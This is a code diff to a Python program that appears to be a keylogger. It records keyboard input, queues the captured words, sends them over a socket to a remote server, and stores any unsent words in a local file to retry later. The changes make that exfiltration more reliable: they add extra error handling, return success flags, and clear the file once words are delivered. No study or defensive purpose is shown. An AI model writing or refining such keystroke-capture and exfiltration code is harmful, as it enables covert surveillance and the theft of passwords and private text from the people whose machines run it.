@@ -2,14 +2,13 @@
 
 import queue
 import socket
+
 from os import getenv, mkdir, path
 from random import choice
 from string import ascii_letters, ascii_uppercase
 from subprocess import PIPE, run
 from typing import Sequence
-import threading
-
-from keyboard import *
+from keyboard import KeyboardEvent, start_recording
 
 
 def random_string(size, charset):
@@ -79,6 +78,7 @@ class Logger:
 		self.filename = log_file
 		if not self.check_file_empty():
 			self.publish_from_file()
+			self.socket.close()
 
 	def check_file_empty(self) -> bool:
 		"""
@@ -136,30 +136,37 @@ class Logger:
 			return False
 
 		if not self.check_file_empty():
-			self.publish_from_file(True)
+			succeeded = self.publish_from_file(True)
+			if not succeeded:
+				# There was a connection error while sending from the file, so it's likely there will be one when sending
+				# from the queue so  don't try to
+				return False
 
 		while self.output_queue.qsize():
 			current = self.output_queue.get() + " "
-			self.socket.send(current.encode(encoding="latin-1", errors="ignore"))
 			try:
+				self.socket.send(current.encode(encoding="latin-1", errors="ignore"))
 				response = self.socket.recv(32)
 				if response == b"OK":
 					self.output_queue.task_done()
-			except ConnectionAbortedError:
+			except (ConnectionAbortedError, ConnectionResetError):
 				return False
 		self.socket.close()
 		return True
 
-	def publish_from_file(self, connected=False):
+	def publish_from_file(self, connected=False) -> bool:
 		"""
 		If a previous publish attempt failed, the words to be sent were written to the file, so try to send them again.
+
+		:return: If a word couldn't be sent return False, else True
+		:rtype: bool
 		"""
 
 		if not connected:
 			try:
 				self.init_conn()
 			except ConnectionRefusedError:
-				return
+				return False
 
 		with open(self.filename, "r") as _:
 			# Read all the words that need to be sent
@@ -167,20 +174,26 @@ class Logger:
 		failed = []
 
 		for line in data:
+			line = line.strip()
 			for word in line.split(" "):
-				self.socket.send(word.encode(encoding="latin-1", errors="ignore"))
 				try:
+					self.socket.send(word.encode(encoding="latin-1", errors="ignore"))
 					response = self.socket.recv(32)
 					if response != b"OK":
 						# Something went wrong, mark it as failed
 						failed.append(word)
-				except ConnectionAbortedError:
-					return
+				except (ConnectionAbortedError, ConnectionResetError):
+					return False
 
 		if failed:
 			# The failed list is not empty, some words couldn't be sent so write them back
 			with open(self.filename, "w") as _:
-				_.write(''.join(word for word in failed))
+				_.write(' '.join(word for word in failed))
+			return False
+		else:
+			# Everything was sent correctly, so erase the contents of the file
+			open(self.filename, "w").close()
+			return True
 
 	def handle_input(self) -> None:
 		"""
